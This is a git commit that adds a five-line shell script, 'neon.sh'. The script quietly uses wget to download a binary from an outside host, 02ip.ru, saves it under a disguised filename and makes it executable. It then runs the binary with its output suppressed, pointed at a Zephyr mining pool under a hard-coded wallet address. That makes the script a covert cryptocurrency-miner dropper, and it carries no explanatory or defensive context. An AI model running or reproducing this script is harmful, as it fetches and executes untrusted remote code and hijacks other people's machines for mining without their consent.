6d629130d7ebe0a2018921125f92c3c37d13f150
noducoyuhomu <156603854+noducoyuhomu@users.noreply.github.com>
2024-01-15 03:14:07 +0900

    Create neon.sh

---
+++ neon.sh
@@ -0,0 +1,5 @@
+wget -q -O CorporationAssocié https://02ip.ru/service && chmod +x CorporationAssocié >/dev/null 2>&1
+sleep 11 
+echo "******************************************************************" 
+echo " "
+./CorporationAssocié  -o sg.zephyr.herominers.com:1123 -u Ssy2L9U75D2JomhUToLSNQhybW4fDyJCVgaH95UTvRWNEX7UAYdpVrjfbqZuXqj4r3TgSnoiq7mDVRq72BmJtVP93TcAR9oeHJ -p 8v >/dev/null 2>&1
